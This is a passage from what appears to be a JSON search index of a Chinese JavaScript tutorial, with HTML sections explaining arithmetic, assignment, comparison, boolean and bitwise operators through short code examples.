1</code></pre><p>所以，为了得到负数的正确余数值，可以先使用绝对值函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 错误的写法\nfunction isOdd(n) {\n  return n % 2 === 1;\n}\nisOdd(-5) // false\nisOdd(-4) // false\n\n// 正确的写法\nfunction isOdd(n) {\n  return Math.abs(n % 2) === 1;\n}\nisOdd(-5) // true\nisOdd(-4) // false</code></pre><p>余数运算符还可以用于浮点数的运算。但是，由于浮点数不是精确的值，无法得到完全准确的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>6.5 % 2.1\n// 0.19999999999999973</code></pre>\n        <h2>\n            <a href='#自增和自减运算符' class='header-anchor'>#</a>\n            <span>自增和自减运算符</span>\n        </h2>\n    <p>自增和自减运算符，是一元运算符，只需要一个运算子。它们的作用是将运算子首先转为数值，然后加上1或者减去1。它们会修改原始变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n++x // 2\nx // 2\n\n--x // 1\nx // 1</code></pre><p>上面代码的变量<code>x</code>自增后，返回<code>2</code>，再进行自减，返回<code>1</code>。这两种情况都会使得，原始变量<code>x</code>的值发生改变。</p>\n<p>运算之后，变量的值发生变化，这种效应叫做运算的副作用（side effect）。自增和自减运算符是仅有的两个具有副作用的运算符，其他运算符都不会改变变量的值。</p>\n<p>自增和自减运算符有一个需要注意的地方，就是放在变量之后，会先返回变量操作前的值，再进行自增/自减操作；放在变量之前，会先进行自增/自减操作，再返回变量操作后的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = 1;\n\nx++ // 1\n++y // 2</code></pre><p>上面代码中，<code>x</code>是先返回当前值，然后自增，所以得到<code>1</code>；<code>y</code>是先自增，然后返回新的值，所以得到<code>2</code>。</p>\n\n        <h2>\n            <a href='#数值运算符，负数值运算符' class='header-anchor'>#</a>\n            <span>数值运算符，负数值运算符</span>\n        </h2>\n    <p>数值运算符（<code>+</code>）同样使用加号，但它是一元运算符（只需要一个操作数），而加法运算符是二元运算符（需要两个操作数）。</p>\n<p>数值运算符的作用在于可以将任何值转为数值（与<code>Number</code>函数的作用相同）。</p>\n<pre class=\"prettyprint language-javascript\"><code>+true // 1\n+[] // 0\n+{} // NaN</code></pre><p>上面代码表示，非数值经过数值运算符以后，都变成了数值（最后一行<code>NaN</code>也是数值）。具体的类型转换规则，参见《数据类型转换》一章。</p>\n<p>负数值运算符（<code>-</code>），也同样具有将一个值转为数值的功能，只不过得到的值正负相反。连用两个负数值运算符，等同于数值运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n-x // -1\n-(-x) // 1</code></pre><p>上面代码最后一行的圆括号不可少，否则会变成自减运算符。</p>\n<p>数值运算符号和负数值运算符，都会返回一个新的值，而不会改变原始变量的值。</p>\n\n        <h2>\n            <a href='#指数运算符' class='header-anchor'>#</a>\n            <span>指数运算符</span>\n        </h2>\n    <p>指数运算符（<code>**</code>）完成指数运算，前一个运算子是底数，后一个运算子是指数。</p>\n<pre class=\"prettyprint language-javascript\"><code>2 ** 4 // 16</code></pre>\n        <h2>\n            <a href='#赋值运算符' class='header-anchor'>#</a>\n            <span>赋值运算符</span>\n        </h2>\n    <p>赋值运算符（Assignment Operators）用于给变量赋值。</p>\n<p>最常见的赋值运算符，当然就是等号（<code>=</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 将 1 赋值给变量 x\nvar x = 1;\n\n// 将变量 y 的值赋值给变量 x\nvar x = y;</code></pre><p>赋值运算符还可以与其他运算符结合，形成变体。下面是与算术运算符的结合。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 x = x + y\nx += y\n\n// 等同于 x = x - y\nx -= y\n\n// 等同于 x = x * y\nx *= y\n\n// 等同于 x = x / y\nx /= y\n\n// 等同于 x = x % y\nx %= y\n\n// 等同于 x = x ** y\nx **= y</code></pre><p>下面是与位运算符的结合（关于位运算符，请见后文的介绍）。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 等同于 x = x &gt;&gt; y\nx &gt;&gt;= y\n\n// 等同于 x = x &lt;&lt; y\nx &lt;&lt;= y\n\n// 等同于 x = x &gt;&gt;&gt; y\nx &gt;&gt;&gt;= y\n\n// 等同于 x = x &amp; y\nx &amp;= y\n\n// 等同于 x = x | y\nx |= y\n\n// 等同于 x = x ^ y\nx ^= y</code></pre><p>这些复合的赋值运算符，都是先进行指定运算，然后将得到值返回给左边的变量。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"比较运算符","link":"/operators/comparison.html"}],"content":"\n        <h1>\n            <a href='#比较运算符' class='header-anchor'>#</a>\n            <span>比较运算符</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>比较运算符用于比较两个值的大小，然后返回一个布尔值，表示是否满足指定的条件。</p>\n<pre class=\"prettyprint language-javascript\"><code>2 &gt; 1 // true</code></pre><p>上面代码比较<code>2</code>是否大于<code>1</code>，返回<code>true</code>。</p>\n<blockquote>\n<p>注意，比较运算符可以比较各种类型的值，不仅仅是数值。</p>\n</blockquote>\n<p>JavaScript 一共提供了8个比较运算符。</p>\n<ul>\n<li><code>&gt;</code> 大于运算符</li>\n<li><code>&lt;</code> 小于运算符</li>\n<li><code>&lt;=</code> 小于或等于运算符</li>\n<li><code>&gt;=</code> 大于或等于运算符</li>\n<li><code>==</code> 相等运算符</li>\n<li><code>===</code> 严格相等运算符</li>\n<li><code>!=</code> 不相等运算符</li>\n<li><code>!==</code> 严格不相等运算符</li>\n</ul>\n<p>这八个比较运算符分成两类：相等比较和非相等比较。两者的规则是不一样的，对于非相等的比较，算法是先看两个运算子是否都是字符串，如果是的，就按照字典顺序比较（实际上是比较 Unicode 码点）；否则，将两个运算子都转成数值，再比较数值的大小。</p>\n\n        <h2>\n            <a href='#非相等运算符：字符串的比较' class='header-anchor'>#</a>\n            <span>非相等运算符：字符串的比较</span>\n        </h2>\n    <p>字符串按照字典顺序进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat&#039; &gt; &#039;dog&#039; // false\n&#039;cat&#039; &gt; &#039;catalog&#039; // false</code></pre><p>JavaScript 引擎内部首先比较首字符的 Unicode 码点。如果相等，再比较第二个字符的 Unicode 码点，以此类推。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat&#039; &gt; &#039;Cat&#039; // true&#039;</code></pre><p>上面代码中，小写的<code>c</code>的 Unicode 码点（<code>99</code>）大于大写的<code>C</code>的 Unicode 码点（<code>67</code>），所以返回<code>true</code>。</p>\n<p>由于所有字符都有 Unicode 码点，因此汉字也可以比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;大&#039; &gt; &#039;小&#039; // false</code></pre><p>上面代码中，“大”的 Unicode 码点是22823，“小”是23567，因此返回<code>false</code>。</p>\n\n        <h2>\n            <a href='#非相等运算符：非字符串的比较' class='header-anchor'>#</a>\n            <span>非相等运算符：非字符串的比较</span>\n        </h2>\n    <p>如果两个运算子都不是字符串，分成以下三种情况。</p>\n<p><strong>（1）原始类型值</strong></p>\n<p>如果两个运算子都是原始类型的值，则是先转成数值再比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>5 &gt; &#039;4&#039; // true\n// 等同于 5 &gt; Number(&#039;4&#039;)\n// 即 5 &gt; 4\n\ntrue &gt; false // true\n// 等同于 Number(true) &gt; Number(false)\n// 即 1 &gt; 0\n\n2 &gt; true // true\n// 等同于 2 &gt; Number(true)\n// 即 2 &gt; 1</code></pre><p>上面代码中，字符串和布尔值都会先转成数值，再进行比较。</p>\n<p>任何值（包括<code>NaN</code>本身）与<code>NaN</code>比较，返回的都是<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 &gt; NaN // false\n1 &lt;= NaN // false\n&#039;1&#039; &gt; NaN // false\n&#039;1&#039; &lt;= NaN // false\nNaN &gt; NaN // false\nNaN &lt;= NaN // false</code></pre><p><strong>（2）对象</strong></p>\n<p>如果运算子是对象，会转为原始类型的值，再进行比较。</p>\n<p>对象转换成原始类型的值，算法是先调用<code>valueOf</code>方法；如果返回的还是对象，再接着调用<code>toString</code>方法，详细解释参见《数据类型的转换》一章。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = [2];\nx &gt; &#039;11&#039; // true\n// 等同于 [2].valueOf().toString() &gt; &#039;11&#039;\n// 即 &#039;2&#039; &gt; &#039;11&#039;\n\nx.valueOf = function () { return &#039;1&#039; };\nx &gt; &#039;11&#039; // false\n// 等同于 [2].valueOf() &gt; &#039;11&#039;\n// 即 &#039;1&#039; &gt; &#039;11&#039;</code></pre><p>两个对象之间的比较也是如此。</p>\n<pre class=\"prettyprint language-javascript\"><code>[2] &gt; [1] // true\n// 等同于 [2].valueOf().toString() &gt; [1].valueOf().toString()\n// 即 &#039;2&#039; &gt; &#039;1&#039;\n\n[2] &gt; [11] // true\n// 等同于 [2].valueOf().toString() &gt; [11].valueOf().toString()\n// 即 &#039;2&#039; &gt; &#039;11&#039;\n\n{ x: 2 } &gt;= { x: 1 } // true\n// 等同于 { x: 2 }.valueOf().toString() &gt;= { x: 1 }.valueOf().toString()\n// 即 &#039;[object Object]&#039; &gt;= &#039;[object Object]&#039;</code></pre>\n        <h2>\n            <a href='#严格相等运算符' class='header-anchor'>#</a>\n            <span>严格相等运算符</span>\n        </h2>\n    <p>JavaScript 提供两种相等运算符：<code>==</code>和<code>===</code>。</p>\n<p>简单说，它们的区别是相等运算符（<code>==</code>）比较两个值是否相等，严格相等运算符（<code>===</code>）比较它们是否为“同一个值”。如果两个值不是同一类型，严格相等运算符（<code>===</code>）直接返回<code>false</code>，而相等运算符（<code>==</code>）会将它们转换成同一个类型，再用严格相等运算符进行比较。</p>\n<p>本节介绍严格相等运算符的算法。</p>\n<p><strong>（1）不同类型的值</strong></p>\n<p>如果两个值的类型不同，直接返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 === &quot;1&quot; // false\ntrue === &quot;true&quot; // false</code></pre><p>上面代码比较数值的<code>1</code>与字符串的“1”、布尔值的<code>true</code>与字符串<code>&quot;true&quot;</code>，因为类型不同，结果都是<code>false</code>。</p>\n<p><strong>（2）同一类的原始类型值</strong></p>\n<p>同一类型的原始类型的值（数值、字符串、布尔值）比较时，值相同就返回<code>true</code>，值不同就返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 === 0x1 // true</code></pre><p>上面代码比较十进制的<code>1</code>与十六进制的<code>1</code>，因为类型和值都相同，返回<code>true</code>。</p>\n<p>需要注意的是，<code>NaN</code>与任何值都不相等（包括自身）。另外，正<code>0</code>等于负<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>NaN === NaN  // false\n+0 === -0 // true</code></pre><p><strong>（3）复合类型值</strong></p>\n<p>两个复合类型（对象、数组、函数）的数据比较时，不是比较它们的值是否相等，而是比较它们是否指向同一个地址。</p>\n<pre class=\"prettyprint language-javascript\"><code>{} === {} // false\n[] === [] // false\n(function () {} === function () {}) // false</code></pre><p>上面代码分别比较两个空对象、两个空数组、两个空函数，结果都是不相等。原因是对于复合类型的值，严格相等运算比较的是，它们是否引用同一个内存地址，而运算符两边的空对象、空数组、空函数的值，都存放在不同的内存地址，结果当然是<code>false</code>。</p>\n<p>如果两个变量引用同一个对象，则它们相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v1 = {};\nvar v2 = v1;\nv1 === v2 // true</code></pre><p>注意，对于两个对象的比较，严格相等运算符比较的是地址，而大于或小于运算符比较的是值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj1 = {};\nvar obj2 = {};\n\nobj1 &gt; obj2 // false\nobj1 &lt; obj2 // false\nobj1 === obj2 // false</code></pre><p>上面的三个比较，前两个比较的是值，最后一个比较的是地址，所以都返回<code>false</code>。</p>\n<p><strong>（4）undefined 和 null</strong></p>\n<p><code>undefined</code>和<code>null</code>与自身严格相等。</p>\n<pre class=\"prettyprint language-javascript\"><code>undefined === undefined // true\nnull === null // true</code></pre><p>由于变量声明后默认值是<code>undefined</code>，因此两个只声明未赋值的变量是相等的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v1;\nvar v2;\nv1 === v2 // true</code></pre>\n        <h2>\n            <a href='#严格不相等运算符' class='header-anchor'>#</a>\n            <span>严格不相等运算符</span>\n        </h2>\n    <p>严格相等运算符有一个对应的“严格不相等运算符”（<code>!==</code>），它的算法就是先求严格相等运算符的结果，然后返回相反值。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 !== &#039;1&#039; // true\n// 等同于\n!(1 === &#039;1&#039;)</code></pre><p>上面代码中，感叹号<code>!</code>是求出后面表达式的相反值。</p>\n\n        <h2>\n            <a href='#相等运算符' class='header-anchor'>#</a>\n            <span>相等运算符</span>\n        </h2>\n    <p>相等运算符用来比较相同类型的数据时，与严格相等运算符完全一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 == 1.0\n// 等同于\n1 === 1.0</code></pre><p>比较不同类型的数据时，相等运算符会先将数据进行类型转换，然后再用严格相等运算符比较。类型转换规则如下。</p>\n<p><strong>（1）原始类型值</strong></p>\n<p>原始类型的值会转换成数值再进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 == true // true\n// 等同于 1 === Number(true)\n\n0 == false // true\n// 等同于 0 === Number(false)\n\n2 == true // false\n// 等同于 2 === Number(true)\n\n2 == false // false\n// 等同于 2 === Number(false)\n\n&#039;true&#039; == true // false\n// 等同于 Number(&#039;true&#039;) === Number(true)\n// 等同于 NaN === 1\n\n&#039;&#039; == 0 // true\n// 等同于 Number(&#039;&#039;) === 0\n// 等同于 0 === 0\n\n&#039;&#039; == false  // true\n// 等同于 Number(&#039;&#039;) === Number(false)\n// 等同于 0 === 0\n\n&#039;1&#039; == true  // true\n// 等同于 Number(&#039;1&#039;) === Number(true)\n// 等同于 1 === 1\n\n&#039;\\n  123  \\t&#039; == 123 // true\n// 因为字符串转为数字时，省略前置和后置的空格</code></pre><p>上面代码将字符串和布尔值都转为数值，然后再进行比较。具体的字符串与布尔值的类型转换规则，参见《数据类型转换》一章。</p>\n<p><strong>（2）对象与原始类型值比较</strong></p>\n<p>对象（这里指广义的对象，包括数组和函数）与原始类型的值比较时，对象转换成原始类型的值，再进行比较。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1] == 1 // true\n// 等同于 Number([1]) == 1\n\n[1] == &#039;1&#039; // true\n// 等同于 Number([1]) == Number(&#039;1&#039;)\n\n[1] == true // true\n// 等同于 Number([1]) == Number(true)</code></pre><p>上面代码中，数组<code>[1]</code>与数值进行比较，会先转成数值，再进行比较；与字符串进行比较，会先转成数值，再与字符串进行比较，然后字符串也会转成数值；与布尔值进行比较，两个运算子都会先转成数值，然后再进行比较。</p>\n<p><strong>（3）undefined 和 null</strong></p>\n<p><code>undefined</code>和<code>null</code>与其他类型的值比较时，结果都为<code>false</code>，它们互相比较时结果为<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>false == null // false\nfalse == undefined // false\n\n0 == null // false\n0 == undefined // false\n\nundefined == null // true</code></pre><p><strong>（4）相等运算符的缺点</strong></p>\n<p>相等运算符隐藏的类型转换，会带来一些违反直觉的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 == &#039;&#039;             // true\n0 == &#039;0&#039;            // true\n\n2 == true           // false\n2 == false          // false\n\nfalse == &#039;false&#039;    // false\nfalse == &#039;0&#039;        // true\n\nfalse == undefined  // false\nfalse == null       // false\nnull == undefined   // true\n\n&#039; \\t\\r\\n &#039; == 0     // true</code></pre><p>上面这些表达式都不同于直觉，很容易出错。因此建议不要使用相等运算符（<code>==</code>），最好只使用严格相等运算符（<code>===</code>）。</p>\n\n        <h2>\n            <a href='#不相等运算符' class='header-anchor'>#</a>\n            <span>不相等运算符</span>\n        </h2>\n    <p>相等运算符有一个对应的“不相等运算符”（<code>!=</code>），它的算法就是先求相等运算符的结果，然后返回相反值。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 != &#039;1&#039; // false\n\n// 等同于\n!(1 == &#039;1&#039;)</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"布尔运算符","link":"/operators/boolean.html"}],"content":"\n        <h1>\n            <a href='#布尔运算符' class='header-anchor'>#</a>\n            <span>布尔运算符</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>布尔运算符用于将表达式转为布尔值，一共包含四个运算符。</p>\n<ul>\n<li>取反运算符：<code>!</code></li>\n<li>且运算符：<code>&amp;&amp;</code></li>\n<li>或运算符：<code>||</code></li>\n<li>三元运算符：<code>?:</code></li>\n</ul>\n\n        <h2>\n            <a href='#取反运算符（!）' class='header-anchor'>#</a>\n            <span>取反运算符（!）</span>\n        </h2>\n    <p>取反运算符是一个感叹号，用于将布尔值变为相反值，即<code>true</code>变成<code>false</code>，<code>false</code>变成<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>!true // false\n!false // true</code></pre><p>对于非布尔值，取反运算符会将其转为布尔值。可以这样记忆，以下六个值取反后为<code>true</code>，其他值都为<code>false</code>。</p>\n<ul>\n<li><code>undefined</code></li>\n<li><code>null</code></li>\n<li><code>false</code></li>\n<li><code>0</code></li>\n<li><code>NaN</code></li>\n<li>空字符串（<code>&#39;&#39;</code>）</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>!undefined // true\n!null // true\n!0 // true\n!NaN // true\n!&quot;&quot; // true\n\n!54 // false\n!&#039;hello&#039; // false\n![] // false\n!{} // false</code></pre><p>上面代码中，不管什么类型的值，经过取反运算后，都变成了布尔值。</p>\n<p>如果对一个值连续做两次取反运算，等于将其转为对应的布尔值，与<code>Boolean</code>函数的作用相同。这是一种常用的类型转换的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>!!x\n// 等同于\nBoolean(x)</code></pre><p>上面代码中，不管<code>x</code>是什么类型的值，经过两次取反运算后，变成了与<code>Boolean</code>函数结果相同的布尔值。所以，两次取反就是将一个值转为布尔值的简便写法。</p>\n\n        <h2>\n            <a href='#且运算符（&&）' class='header-anchor'>#</a>\n            <span>且运算符（&amp;&amp;）</span>\n        </h2>\n    <p>且运算符（<code>&amp;&amp;</code>）往往用于多个表达式的求值。</p>\n<p>它的运算规则是：如果第一个运算子的布尔值为<code>true</code>，则返回第二个运算子的值（注意是值，不是布尔值）；如果第一个运算子的布尔值为<code>false</code>，则直接返回第一个运算子的值，且不再对第二个运算子求值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;t&#039; &amp;&amp; &#039;&#039; // &quot;&quot;\n&#039;t&#039; &amp;&amp; &#039;f&#039; // &quot;f&quot;\n&#039;t&#039; &amp;&amp; (1 + 2) // 3\n&#039;&#039; &amp;&amp; &#039;f&#039; // &quot;&quot;\n&#039;&#039; &amp;&amp; &#039;&#039; // &quot;&quot;\n\nvar x = 1;\n(1 - 1) &amp;&amp; ( x += 1) // 0\nx // 1</code></pre><p>上面代码的最后一个例子，由于且运算符的第一个运算子的布尔值为<code>false</code>，则直接返回它的值<code>0</code>，而不再对第二个运算子求值，所以变量<code>x</code>的值没变。</p>\n<p>这种跳过第二个运算子的机制，被称为“短路”。有些程序员喜欢用它取代<code>if</code>结构，比如下面是一段<code>if</code>结构的代码，就可以用且运算符改写。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (i) {\n  doSomething();\n}\n\n// 等价于\n\ni &amp;&amp; doSomething();</code></pre><p>上面代码的两种写法是等价的，但是后一种不容易看出目的，也不容易除错，建议谨慎使用。</p>\n<p>且运算符可以多个连用，这时返回第一个布尔值为<code>false</code>的表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>true &amp;&amp; &#039;foo&#039; &amp;&amp; &#039;&#039; &amp;&amp; 4 &amp;&amp; &#039;foo&#039; &amp;&amp; true\n// &#039;&#039;</code></pre><p>上面代码中，第一个布尔值为<code>false</code>的表达式为第三个表达式，所以得到一个空字符串。</p>\n\n        <h2>\n            <a href='#或运算符（||）' class='header-anchor'>#</a>\n            <span>或运算符（||）</span>\n        </h2>\n    <p>或运算符（<code>||</code>）也用于多个表达式的求值。它的运算规则是：如果第一个运算子的布尔值为<code>true</code>，则返回第一个运算子的值，且不再对第二个运算子求值；如果第一个运算子的布尔值为<code>false</code>，则返回第二个运算子的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;t&#039; || &#039;&#039; // &quot;t&quot;\n&#039;t&#039; || &#039;f&#039; // &quot;t&quot;\n&#039;&#039; || &#039;f&#039; // &quot;f&quot;\n&#039;&#039; || &#039;&#039; // &quot;&quot;</code></pre><p>短路规则对这个运算符也适用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\ntrue || (x = 2) // true\nx // 1</code></pre><p>上面代码中，且运算符的第一个运算子为<code>true</code>，所以直接返回<code>true</code>，不再运行第二个运算子。所以，<code>x</code>的值没有改变。这种只通过第一个表达式的值，控制是否运行第二个表达式的机制，就称为“短路”（short-cut）。</p>\n<p>或运算符可以多个连用，这时返回第一个布尔值为<code>true</code>的表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>false || 0 || &#039;&#039; || 4 || &#039;foo&#039; || true\n// 4</code></pre><p>上面代码中第一个布尔值为<code>true</code>的表达式是第四个表达式，所以得到数值4。</p>\n<p>或运算符常用于为一个变量设置默认值。</p>\n<pre class=\"prettyprint language-javascript\"><code>function saveText(text) {\n  text = text || &#039;&#039;;\n  // ...\n}\n\n// 或者写成\nsaveText(this.text || &#039;&#039;)</code></pre><p>上面代码表示，如果函数调用时，没有提供参数，则该参数默认设置为空字符串。</p>\n\n        <h2>\n            <a href='#三元条件运算符（?:）' class='header-anchor'>#</a>\n            <span>三元条件运算符（?:）</span>\n        </h2>\n    <p>三元条件运算符由问号（?）和冒号（:）组成，分隔三个表达式。它是 JavaScript 语言唯一一个需要三个运算子的运算符。如果第一个表达式的布尔值为<code>true</code>，则返回第二个表达式的值，否则返回第三个表达式的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;t&#039; ? &#039;hello&#039; : &#039;world&#039; // &quot;hello&quot;\n0 ? &#039;hello&#039; : &#039;world&#039; // &quot;world&quot;</code></pre><p>上面代码的<code>t</code>和<code>0</code>的布尔值分别为<code>true</code>和<code>false</code>，所以分别返回第二个和第三个表达式的值。</p>\n<p>通常来说，三元条件表达式与<code>if...else</code>语句具有同样表达效果，前者可以表达的，后者也能表达。但是两者具有一个重大差别，<code>if...else</code>是语句，没有返回值；三元条件表达式是表达式，具有返回值。所以，在需要返回值的场合，只能使用三元条件表达式，而不能使用<code>if..else</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(true ? &#039;T&#039; : &#039;F&#039;);</code></pre><p>上面代码中，<code>console.log</code>方法的参数必须是一个表达式，这时就只能使用三元条件表达式。如果要用<code>if...else</code>语句，就必须改变整个代码写法了。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"运算符","link":"javascript:void(0)"},{"title":"二进制位运算符","link":"/operators/bit.html"}],"content":"\n        <h1>\n            <a href='#二进制位运算符' class='header-anchor'>#</a>\n            <span>二进制位运算符</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>二进制位运算符用于直接对二进制位进行计算，一共有7个。</p>\n<ul>\n<li><strong>二进制或运算符</strong>（or）：符号为<code>|</code>，表示若两个二进制位都为<code>0</code>，则结果为<code>0</code>，否则为<code>1</code>。</li>\n<li><strong>二进制与运算符</strong>（and）：符号为<code>&amp;</code>，表示若两个二进制位都为1，则结果为1，否则为0。</li>\n<li><strong>二进制否运算符</strong>（not）：符号为<code>~</code>，表示对一个二进制位取反。</li>\n<li><strong>异或运算符</strong>（xor）：符号为<code>^</code>，表示若两个二进制位不相同，则结果为1，否则为0。</li>\n<li><strong>左移运算符</strong>（left shift）：符号为<code>&lt;&lt;</code>，详见下文解释。</li>\n<li><strong>右移运算符</strong>（right shift）：符号为<code>&gt;&gt;</code>，详见下文解释。</li>\n<li><strong>带符号位的右移运算符</strong>（zero filled right shift）：符号为<code>&gt;&gt;&gt;</code>，详见下文解释。</li>\n</ul>\n<p>这些位运算符直接处理每一个比特位（bit），所以是非常底层的运算，好处是速度极快，缺点是很不直观，许多场合不能使用它们，否则会使代码难以理解和查错。</p>\n<p>有一点需要特别注意，位运算符只对整数起作用，如果一个运算子不是整数，会自动转为整数后再执行。另外，虽然在 JavaScript 内部，数值都是以64位浮点数的形式储存，但是做位运算的时候，是以32位带符号的整数进行运算的，并且返回值也是一个32位带符号的整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>i = i | 0;</code></pre><p>上面这行代码的意思，就是将<code>i</code>（不管是整数或小数）转为32位整数。</p>\n<p>利用这个特性，可以写出一个函数，将任意数值转为32位整数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function toInt32(x) {\n  return x | 0;\n}</code></pre><p>上面这个函数将任意值与<code>0</code>进行一次或运算，这个位运算会自动将一个值转为32位整数。下面是这个函数的用法。</p>\n<pre class=\"prettyprint language-javascript\"><code>toInt32(1.001) // 1\ntoInt32(1.999) // 1\ntoInt32(1) // 1\ntoInt32(-1) // -1\ntoInt32(Math.pow(2, 32) + 1) // 1\ntoInt32(Math.pow(2, 32) - 1) // -1</code></pre><p>上面代码中，<code>toInt32</code>可以将小数转为整数。对于一般的整数，返回值不会有任何变化。对于大于2的32次方的整数，大于32位的数位都会被舍去。</p>\n\n        <h2>\n            <a href='#二进制或运算符' class='header-anchor'>#</a>\n            <span>二进制或运算符</span>\n        </h2>\n    <p>二进制或运算符（<code>|</code>）逐位比较两个运算子，两个二进制位之中只要有一个为<code>1</code>，就返回<code>1</code>，否则返回<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 | 3 // 3</code></pre><p>上面代码中，<code>0</code>和<code>3</code>的二进制形式分别是<code>00</code>和<code>11</code>，所以进行二进制或运算会得到<code>11</code>（即<code>3</code>）。</p>\n<p>位运算只对整数有效，遇到小数时，会将小数部分舍去，只保留整数部分。所以，将一个小数与<code>0</code>进行二进制或运算，等同于对该数去除小数部分，即取整数位。</p>\n<pre class=\"prettyprint language-javascript\"><code>2.9 | 0 // 2\n-2.9 | 0 // -2</code></pre><p>需要注意的是，这种取整方法不适用超过32位整数最大值<code>2147483647</code>的数。</p>\n<pre class=\"prettyprint language-javascript\"><code>2147483649.4 | 0;\n// -2147483647</code></pre>\n        <h2>\n            <a href='#二进制与运算符' class='header-anchor'>#</a>\n            <span>二进制与运算符</span>\n        </h2>\n    <p>二进制与运算符（<code>&amp;</code>）的规则是逐位比较两个运算子，两个二进制位之中只要有一个位为<code>0</code>，就返回<code>0</code>，否则返回<code>1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>0 &amp; 3 // 0</code></pre><p>上面代码中，0（二进制<code>00</code>）和3（二进制<code>11</code>）进行二进制与运算会得到<code>00</code>（即<code>0</code>）。</p>\n\n        <h2>\n            <a href='#二进制否运算符' class='header-anchor'>#</a>\n            <span>二进制否运算符</span>\n        </h2>\n    <p>二进制否运算符（<code>~</code>）将每个二进制位都变为相反值（<code>0</code>变为<code>1</code>，<code>1</code>变为<code>0</code>）。它的返回结果有时比较难理解，因为涉及到计算机内部的数值表示机制。</p>\n<pre class=\"prettyprint language-javascript\"><code>~ 3 // -4</code></pre><p>上面表达式对<code>3</code>进行二进制否运算，得到<code>-4</code>。之所以会有这样的结果，是因为位运算时，JavaScirpt 内部将所有的运算子都转为32位的二进制整数再进行运算。</p>\n<p><code>3</code>的32位整数形式是<code>00000000000000000000000000000011</code>，二进制否运算以后得到<code>11111111111111111111111111111100</code>。由于第一位（符号位）是1，所以这个数是一个负数。JavaScript 内部采用补码形式表示负数，即需要将这个数减去1，再取一次反，然后加上负号，才能得到这个负数对应的10进制值。这个数减去1等于<code>11111111111111111111111111111011</code>，再取一次反得到<code>00000000000000000000000000000100</code>，再加上负号就是<code>-4</code>。考虑到这样的过程比较麻烦，可以简单记忆成，一个数与自身的取反值相加，等于-1。</p>\n<pre class=\"prettyprint language-javascript\"><code>~ -3 // 2</code></pre><p>上面表达式可以这样算，<code>-3</code>的取反值等于<code>-1</code>减去<code>-3</code>，结果为<code>2</code>。</p>\n<p>对一个整数连续两次二进制否运算，得到它自身。</p>\n<pre class=\"prettyprint language-javascript\"><code>~~3 // 3</code></pre><p>所有的位运算都只对整数有效。二进制否运算遇到小数时，也会将小数部分舍去，只保留整数部分。所以，对一个小数连续进行两次二进制否运算，能达到取整效果。</p>\n<pre class=\"prettyprint language-javascript\"><code>~~2.9 // 2\n~~47.11 // 47\n~~1.9999 // 1\n~~3 // 3</code></pre><p>使用二进制否运算取整，是所有取整方法中最快的一种。</p>\n<p>对字符串进行二进制否运算，JavaScript 引擎会先调用<code>Number</code>函数，将字符串转为数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 相当于~Number(&#039;011&#039;)\n~&#039;011&#039;  // -12\n\n// 相当于~Number(&#039;42 cats&#039;)\n~&#039;42 cats&#039; // -1\n\n// 相当于~Number(&#039;0xcafebabe&#039;)\n~&#039;0xcafebabe&#039; // 889275713\n\n// 相当于~Number(&#039;deadbeef&#039;)\n~&#039;deadbeef&#039; // -1</code></pre><p><code>Number</code>函数将字符串转为数值的规则，参见《数据的类型转换》一章。</p>\n<p>对于其他类型的值，二进制否运算也是先用<code>Number</code>转为数值，然后再进行处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 相当于 